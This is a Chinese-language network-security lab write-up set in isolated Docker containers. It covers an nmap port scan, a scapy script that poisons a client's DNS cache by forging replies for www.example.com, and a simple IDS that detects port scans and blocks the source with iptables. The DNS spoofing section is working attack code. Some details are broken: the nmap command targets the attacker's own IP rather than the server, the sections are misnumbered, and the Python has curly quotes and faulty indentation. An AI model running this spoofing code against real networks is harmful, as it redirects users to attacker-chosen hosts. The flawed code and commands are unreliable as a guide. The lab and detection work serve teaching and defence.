### 1.4 端口扫描
#### 相关容器：

* 攻击者容器A
   * IP：`10.9.0.1`
* 服务器容器B
    * IP：`10.9.0.5`

#### 攻击步骤：

在容器A上安装nmap程序，再从容器A通过nmap命令

```shell
nmap 10.9.0.1 -p1-200
```

实现从容器A扫描容器B的1到200端口。

### 1.2 DNS Poisoning

#### 相关容器：

* 攻击者容器A
    * IP：`10.9.0.1`
* 服务器容器B
    * IP：`10.9.0.5`
* 本地DNS
    * IP：`10.9.0.11`
####攻击步骤：
在容器A运行DNS Poisoning攻击程序，代码如下：

```python
#!/usr/bin/env python3 
from scapy.all import * 

def spoof_dns(pkt): 
      if (DNS in pkt and ’www.example.com’ in pkt[DNS].qd.qname.decode(’utf-8’)): 
      IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) 
      UDPpkt = UDP(dport=pkt[UDP].sport, sport=53) 
      Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type=’A’, ttl=259200, rdata=’10.0.2.5’) 
      DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, an=Anssec) 
      spoofpkt = IPpkt/UDPpkt/DNSpkt 
      send(spoofpkt) 

f = ’udp and dst port 53’ 
pkt = sniff(iface=’br-43d947d991eb’, filter=f, prn=spoof_dns) 
```

当容器B运行dig指令

```shell
dig www.example.com
```

向DNS服务器申请www.example.com的IP时会被容器A监听并将错误IP返回给容器B污染容器B的DNS缓存，从而当容器B访问www.example.com时会直接跳转到错误的IP 10.0.2.5。

### 2.2 IDS框架

![Image text](/struct.png)

### 2.6 基于统计的扫描检测与防御

主要函数为`Statistic`以及`Port_Scan_Protect`

通过分析构造出来的端口扫描报文可以看出，端口扫描攻击往往都是同一个IP向受害者IP的不同端口发送TCP报文从而达到攻击效果。

因此，为了检测端口扫描，我们首先构造字典`IP_port`，在其中每个IP映射一个列表，列表中存放该IP向本机发送报文的目的端口。当某个IP对应列表的数量超过阈值100时，即判断该IP在向本机进行端口扫描，进而发出警报。
若为在线检测，则配置防火墙，对来自该IP的报文进行拦截，配置防火墙命令如下：

```shell
iptables -A INPUT -s src_IP -j DROP
```
